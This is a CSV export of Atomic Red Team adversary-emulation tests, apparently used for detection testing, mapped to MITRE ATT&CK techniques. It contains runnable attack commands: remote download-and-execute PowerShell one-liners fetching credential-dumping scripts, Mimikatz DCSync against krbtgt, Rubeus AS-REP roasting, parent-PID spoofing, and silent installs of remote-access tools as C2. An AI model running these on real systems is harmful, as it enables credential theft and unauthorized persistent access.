T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing - Spawn from Current Process,14920ebd-1d61-491a-85e0-fe98efe37f25,Spawns a powershell.exe process as a child of the current process.,windows,,,Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.file_path.description: File path or name of process to spawn

input_arguments.file_path.type: path

input_arguments.file_path.default: $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe

input_arguments.parent_pid.description: PID of process to spawn from

input_arguments.parent_pid.type: string

input_arguments.parent_pid.default: $PID

input_arguments.command_line.description: Specified command line to use

input_arguments.command_line.type: string

input_arguments.command_line.default: -Command Start-Sleep 10

"
T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing - Spawn from Specified Process,cbbff285-9051-444a-9d17-c07cd2d230eb,Spawns a notepad.exe process as a child of the current process.,windows,,,Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid},powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.parent_pid.description: PID of process to spawn from

input_arguments.parent_pid.type: string

input_arguments.parent_pid.default: $PID

input_arguments.test_guid.description: Defined test GUID

input_arguments.test_guid.type: string

input_arguments.test_guid.default: 12345678-1234-1234-1234-123456789123

"
T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing - Spawn from svchost.exe,e9f2b777-3123-430b-805d-5cedc66ab591,Spawnd a process as a child of the first accessible svchost.exe process.,windows,,,"Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'",powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.command_line.description: Specified command line to use

input_arguments.command_line.type: string

input_arguments.command_line.default: -Command Start-Sleep 10

input_arguments.file_path.description: File path or name of process to spawn

input_arguments.file_path.type: path

input_arguments.file_path.default: $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe

"
T1134.004,Access Token Manipulation: Parent PID Spoofing,Parent PID Spoofing - Spawn from New Process,2988133e-561c-4e42-a15f-6281e6a9b2db,Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.,windows,,,Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}',powershell,,,,,"dependencies.0.description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.
dependencies.0.prereq_command: $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
dependencies.0.get_prereq_command: Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force

","input_arguments.command_line.description: Specified command line to use

input_arguments.command_line.type: string

input_arguments.command_line.default: -Command Start-Sleep 10

input_arguments.file_path.description: File path or name of process to spawn

input_arguments.file_path.type: path

input_arguments.file_path.default: $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe

input_arguments.parent_name.description: Parent process to spoof from

input_arguments.parent_name.type: path

input_arguments.parent_name.default: $Env:windir\System32\notepad.exe

"
T1555.004,Credentials from Password Stores: Windows Credential Manager,Access Saved Credentials via VaultCmd,9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439,"List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe
Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos
https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/
https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16
",windows,,,"vaultcmd /listcreds:""Windows Credentials""
",command_prompt,False,,,,,
T1555.004,Credentials from Password Stores: Windows Credential Manager,WinPwn - Loot local Credentials - Invoke-WCMDump,fa714db1-63dd-479e-a58e-7b2b52ca5997,Loot local Credentials - Invoke-WCMDump technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump",powershell,,,,,,
T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,Rubeus asreproast,615bd568-2859-41b5-9aed-61f6a88e48dd,"Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
",windows,,,"cmd.exe /c ""#{local_folder}\#{local_executable}"" asreproast /outfile:""#{local_folder}\#{out_file}""
",powershell,False,,"Remove-Item ""#{local_folder}\#{out_file}"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

dependencies.1.description: Rubeus must exist

dependencies.1.prereq_command: if(Test-Path -Path ""#{local_folder}\#{local_executable}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

","input_arguments.local_folder.description: Local path of Rubeus executable

input_arguments.local_folder.type: path

input_arguments.local_folder.default: PathToAtomicsFolder\..\ExternalPayloads

input_arguments.local_executable.description: name of the rubeus executable

input_arguments.local_executable.type: string

input_arguments.local_executable.default: rubeus.exe

input_arguments.out_file.description: file where command results are stored

input_arguments.out_file.type: string

input_arguments.out_file.default: rubeus_output.txt

input_arguments.rubeus_url.description: URL of Rubeus executable

input_arguments.rubeus_url.type: url

input_arguments.rubeus_url.default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

"
T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,Get-DomainUser with PowerView,d6139549-7b72-4e48-9ea1-324fc9bdf88a,"Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
",powershell,,,,,,
T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,8c385f88-4d47-4c9a-814d-93d9deec8c71,PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""asreproast /format:hashcat /nowrap""",powershell,,,,,,
T1204.003,User Execution: Malicious Image,Malicious Execution from Mounted ISO Image,e9795c8d-42aa-4ed4-ad80-551ed793d006,Adversaries may rely on a user running a malicious image to facilitate execution,windows,,,"IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso"" -OutFile ""$env:TEMP\qbot-test.iso"")
Mount-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso""
$mountedpath = (Get-DiskImage -ImagePath ""$env:TEMP\qbot-test.iso"" | Get-Volume).DriveLetter
$finalpath = $mountedpath + "":\""
cd $finalpath
.\calc.exe.lnk",powershell,True,,"start-sleep -s 5
stop-process -Name ""Calculatorapp"" -Force 
dismount-diskimage -ImagePath ""$env:TEMP\qbot-test.iso""",,,
T1027.001,Obfuscated Files or Information: Binary Padding,Pad Binary to Change Hash - Linux/macOS dd,ffe2346c-abd5-4b45-a713-bf5f1ebd573a,"Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
",linux,macos,,"dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes
dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data
dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
",sh,,,"rm #{file_to_pad}
",sh,"dependencies.0.description: The binary must exist on disk at specified location (#{file_to_pad})

dependencies.0.prereq_command: if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: cp /bin/ls #{file_to_pad}

","input_arguments.file_to_pad.description: Path of binary to be padded

input_arguments.file_to_pad.type: path

input_arguments.file_to_pad.default: /tmp/evil-binary

"
T1027.001,Obfuscated Files or Information: Binary Padding,Pad Binary to Change Hash using truncate command - Linux/macOS,e22a9e89-69c7-410f-a473-e6c212cd2292,"Uses truncate to add a byte to the binary to change the hash.

Upon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.
",linux,macos,,"truncate -s +1 #{file_to_pad} #adds a byte to the file size
",sh,,,"rm #{file_to_pad}
",sh,"dependencies.0.description: The binary must exist on disk at specified location (#{file_to_pad})

dependencies.0.prereq_command: if [ -f #{file_to_pad} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: cp /bin/ls #{file_to_pad}

","input_arguments.file_to_pad.description: Path of binary to be padded

input_arguments.file_to_pad.type: path

input_arguments.file_to_pad.default: /tmp/evil-binary

"
T1090.001,Proxy: Internal Proxy,Connection Proxy,0ac21132-4485-4212-a681-349e8a6637cd,"Enable traffic redirection.

Note that this test may conflict with pre-existing system configuration.
",linux,macos,,"export #{proxy_scheme}_proxy=#{proxy_server}
",sh,,,"unset http_proxy
unset https_proxy
",,,"input_arguments.proxy_server.description: Proxy server URL (host:port)

input_arguments.proxy_server.type: url

input_arguments.proxy_server.default: 127.0.0.1:8080

input_arguments.proxy_scheme.description: Protocol to proxy (http or https)

input_arguments.proxy_scheme.type: string

input_arguments.proxy_scheme.default: http

"
T1090.001,Proxy: Internal Proxy,Connection Proxy for macOS UI,648d68c1-8bcd-4486-9abe-71c6655b6a2c,"Enable traffic redirection on macOS UI (not terminal).
The test will modify and enable the ""Web Proxy"" and ""Secure Web Proxy"" settings  in System Preferences => Network => Advanced => Proxies for the specified network interface.

Note that this test may conflict with pre-existing system configuration.
",macos,,,"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
",sh,,,"networksetup -setwebproxystate #{interface} off
networksetup -setsecurewebproxystate #{interface} off  
",,,"input_arguments.proxy_server.description: Proxy server URL (host)

input_arguments.proxy_server.type: url

input_arguments.proxy_server.default: 127.0.0.1

input_arguments.proxy_port.description: Proxy server port

input_arguments.proxy_port.type: integer

input_arguments.proxy_port.default: 8080

input_arguments.interface.description: Protocol to proxy (http or https)

input_arguments.interface.type: string

input_arguments.interface.default: Wi-Fi

"
T1090.001,Proxy: Internal Proxy,portproxy reg key,b8223ea9-4be2-44a6-b50a-9657a3d4e72a,"Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
Upon execution there will be a new proxy entry in netsh
netsh interface portproxy show all
",windows,,,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress},powershell,True,,netsh interface portproxy delete v4tov4 listenport=#{listenport} -ErrorAction Ignore | Out-Null,,,"input_arguments.connectaddress.description: Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer.

input_arguments.connectaddress.type: string

input_arguments.connectaddress.default: 127.0.0.1

input_arguments.connectport.description: Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer.

input_arguments.connectport.type: string

input_arguments.connectport.default: 1337

input_arguments.listenport.description: Specifies the IPv4 port, by port number or service name, on which to listen.

input_arguments.listenport.type: string

input_arguments.listenport.default: 1337

"
T1003.006,OS Credential Dumping: DCSync,DCSync (Active Directory),129efd28-8497-4c87-a1b0-73b9a870ca3e,"Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)
",windows,,,"#{mimikatz_path} ""lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"" ""exit""
",command_prompt,False,,,powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.domain.description: Targeted Active Directory domain

input_arguments.domain.type: string

input_arguments.domain.default: %userdnsdomain%

input_arguments.user.description: Targeted user

input_arguments.user.type: string

input_arguments.user.default: krbtgt

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: %tmp%\mimikatz\x64\mimikatz.exe

"
T1003.006,OS Credential Dumping: DCSync,Run DSInternals Get-ADReplAccount,a0bced08-3fc5-4d8b-93b7-e8344739376e,"The following Atomic will run Get-ADReplAccount from DSInternals.
Upon successful execution, domain and credentials will appear in stdout. 
[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.
https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/
",windows,,,"Get-ADReplAccount -All -Server #{logonserver}
",powershell,False,,,powershell,"dependencies.0.description: DSInternals must be installed

dependencies.0.prereq_command: $RequiredModule = Get-Module -Name DSInternals -ListAvailable
if (-not $RequiredModule) {exit 1}
if (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}

dependencies.0.get_prereq_command: Install-Module -Name DSInternals -Scope CurrentUser -Force

","input_arguments.logonserver.description: ComputerName argument default %logonserver%

input_arguments.logonserver.type: string

input_arguments.logonserver.default: $ENV:logonserver.TrimStart(""\"")

"
T1566.001,Phishing: Spearphishing Attachment,Download Macro-Enabled Phishing Attachment,114ccff9-ae6d-4547-9ead-4cd69f687306,"This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
The file ""PhishingAttachment.xlsm"" is downloaded to the %temp% directory.
",windows,,,"$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
",powershell,,,"Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
",,,
T1566.001,Phishing: Spearphishing Attachment,Word spawned a command shell and used an IP address in the command line,cbb6799a-425c-4f83-9194-5447a909d67f,"Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
Upon execution, CMD will be launched and ping 8.8.8.8.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   Shell`$ `""ping 8.8.8.8`""`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",powershell,,,"Remove-Item #{jse_path} -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.jse_path.description: Path for the macro to write out the ""malicious"" .jse file


input_arguments.jse_path.type: string

input_arguments.jse_path.default: C:\Users\Public\art.jse

input_arguments.ms_product.description: Maldoc application Word or Excel

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1219,Remote Access Software,TeamViewer Files Detected Test on Windows,8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0,"An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.
",windows,,,"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\TeamViewer_Setup.exe""
Start-Process -Wait $file1 /S; 
Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
",powershell,True,,"$file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
if(Test-Path $file){ Start-Process $file ""/S"" -ErrorAction Ignore | Out-Null }
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\TeamViewer_Setup.exe""
Remove-Item $file1 -ErrorAction Ignore | Out-Null",,,
T1219,Remote Access Software,AnyDesk Files Detected Test on Windows,6b8b7391-5c0a-4f8c-baee-78d8ce0ce330,"An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.
",windows,,,"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""
Start-Process $file1 /S;
",powershell,True,,"$file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""
Remove-Item $file1 -ErrorAction Ignore",,,
T1219,Remote Access Software,LogMeIn Files Detected Test on Windows,d03683ec-aae0-42f9-9b4c-534780e0f8e1,"An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.
",windows,,,"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""
",powershell,True,,"get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package 
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Remove-Item $file1 -ErrorAction Ignore",,,
T1219,Remote Access Software,GoToAssist Files Detected Test on Windows,1b72b3bd-72f8-4b63-a30b-84e91b9c3578,"An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.
",windows,,,"Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""
$file1 = ""C:\Users\"" + $env:username + ""\Downloads\GoToAssist.exe""
Start-Process $file1 /S;
",powershell,True,,"try{""$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1""} catch{}",,,
T1219,Remote Access Software,ScreenConnect Application Download and Install on Windows,4a18cc4e-416f-4966-9a9d-75731c4684c0,"An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
Msiexec will be used to quietly insall ScreenConnect.
",windows,,,"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""
msiexec /i $installer /qn
",powershell,True,,"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
msiexec /x $installer /qn
",,,
T1219,Remote Access Software,Ammyy Admin Software Execution,0ae9e327-3251-465a-a53b-485d4e3f58fa,"An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. 
Upon successful execution, Ammyy Admin will be executed. 
",windows,,,"Start-Process ""#{Ammyy_Admin_Path}""
",powershell,True,,"Stop-Process -Name ""Ammyy"" -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})

dependencies.0.prereq_command: if (Test-Path ""#{Ammyy_Admin_Path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe"" -UseBasicParsing

","input_arguments.Ammyy_Admin_Path.description: Path of Ammyy Admin executable

input_arguments.Ammyy_Admin_Path.type: path

input_arguments.Ammyy_Admin_Path.default: PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe

"
T1219,Remote Access Software,RemotePC Software Execution,fbff3f1f-b0bf-448e-840f-7e1687affdce,"An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. 
Upon successful execution, RemotePC will be executed. 
",windows,,,"Start-Process ""#{RemotePC_Path}""
",powershell,True,,"Unregister-ScheduledTask -TaskName ""RemotePC"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""RPCServiceHealthCheck"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""ServiceMonitor"" -Confirm:$False -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName ""StartRPCService"" -Confirm:$False -ErrorAction SilentlyContinue      
Stop-Process -Name ""RemotePCPerformance"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCPerformanceService"" -force -erroraction silentlycontinue
Stop-Process -Name ""RemotePCUIU"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCDownloader"" -force -erroraction silentlycontinue
Stop-Process -Name ""RemotePCService"" -force -erroraction silentlycontinue
Stop-Process -Name ""RPCService"" -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: RemotePC must exist on disk at the specified location (#{RemotePC_Path})

dependencies.0.prereq_command: if (Test-Path ""#{RemotePC_Path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe"" -OutFile ""#{RemotePC_Path}"" -UseBasicParsing

","input_arguments.RemotePC_Path.description: Path of RemotePC executable

input_arguments.RemotePC_Path.type: path

input_arguments.RemotePC_Path.default: PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe

"
T1219,Remote Access Software,NetSupport - RAT Execution,ecca999b-e0c8-40e8-8416-ad320b146a75,"A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. 
",windows,,,"Start-Process ""#{NetSupport_Path}"" -ArgumentList ""/S /v/qn""
",powershell,True,,"Stop-Process -Name ""client32"" -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})

dependencies.0.prereq_command: if (Test-Path ""#{NetSupport_Path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
(New-Object Net.WebClient).DownloadFile(""https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe"",""#{NetSupport_Path}"")

","input_arguments.NetSupport_Path.description: Path to the NetSupport executable.

input_arguments.NetSupport_Path.type: path

input_arguments.NetSupport_Path.default: PathToAtomicsFolder\..\ExternalPayloads\T1219_NetSupport.exe

"
T1219,Remote Access Software,UltraViewer - RAT Execution,19acf63b-55c4-4b6a-8552-00a8865105c8,"A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. 
",windows,,,"Start-Process -Wait -FilePath ""#{UltraViewer_Path}"" -Argument ""/silent"" -PassThru
Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
",powershell,True,,"Stop-Process -Name ""UltraViewer_Desktop"" -Force -ErrorAction SilentlyContinue
",powershell,"dependencies.0.description: Ultraviewer installer must be downloaded and exist on the disk at the specified location. (#{UltraViewer_Path})

dependencies.0.prereq_command: if (Test-Path ""#{UltraViewer_Path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
(New-Object Net.WebClient).DownloadFile(""https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe"",""#{UltraViewer_Path}"")

","input_arguments.UltraViewer_Path.description: Path to the UltraViewer executable.

input_arguments.UltraViewer_Path.type: path

input_arguments.UltraViewer_Path.default: PathToAtomicsFolder\..\ExternalPayloads\T1219_UltraViewer.exe

"
T1219,Remote Access Software,UltraVNC Execution,42e51815-a6cc-4c75-b970-3f0ff54b610e,"An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.
Upon successful execution, UltraVNC will be executed.
",windows,,,"Start-Process #{UltraVNC_Viewer_Path}
",powershell,True,,"Stop-Process -Name ""vncviewer"" -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: UltraVNC must exist at (#{UltraVNC_Viewer_Path})

dependencies.0.prereq_command: if (Test-Path #{UltraVNC_Viewer_Path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\vncsetup.exe""
start-process ""PathToAtomicsFolder\..\ExternalPayloads\vncsetup.exe"" /silent

","input_arguments.UltraVNC_Viewer_Path.description: Path of UltraVNC Viewer executable

input_arguments.UltraVNC_Viewer_Path.type: path

input_arguments.UltraVNC_Viewer_Path.default: $env:ProgramFiles\'uvnc bvba\UltraVnc\vncviewer.exe'

"
T1219,Remote Access Software,MSP360 Connect Execution,b1b8128b-c5d4-4de9-bf70-e60419274562,"An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.
Upon successful execution, MSP360 Connect will be executed.
